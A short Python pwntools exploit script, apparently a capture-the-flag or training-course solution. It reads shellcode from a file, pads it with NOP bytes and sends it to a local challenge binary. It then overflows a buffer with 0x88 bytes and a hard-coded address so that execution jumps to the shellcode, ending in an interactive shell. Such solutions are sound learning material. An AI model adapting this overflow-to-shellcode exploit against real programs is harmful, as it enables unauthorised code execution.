from pwn import *

shell_adress = 0x000000002d32f000
ofsset = 0x80 + 8
f = open('shellcode-raw','rb') 
shell = f.read()
ret_gadjet = 0x101a
# print(shell)

shell = shell.ljust(0x1000, b'\x90')
print(str(len(shell)))
r = process('/challenge/binary-exploitation-hijack-to-mmap-shellcode')
print(r.recv(timeout=2).decode())
r.send(shell)
print(r.recv(timeout=2).decode())
r.send(b'\n')
payload = ofsset * b'\x00' +  p64(shell_adress)
r.send(payload)
print(r.recv(timeout=5).decode())
r.interactive()
